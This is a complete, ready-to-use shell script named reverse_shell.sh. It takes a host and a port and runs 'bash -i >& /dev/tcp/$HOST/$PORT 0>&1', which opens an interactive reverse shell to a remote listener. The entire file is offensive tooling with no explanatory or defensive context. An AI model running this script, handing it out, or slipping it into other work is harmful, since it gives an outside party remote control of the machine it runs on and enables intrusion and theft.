#!/bin/sh
if [[ -z "$1" || -z "$2" ]]; then
    echo "Usage ./reverse_shell.sh <host> <port>"
    exit 1
fi
HOST="$1"
PORT=$2
bash -i >& /dev/tcp/$HOST/$PORT 0>&1
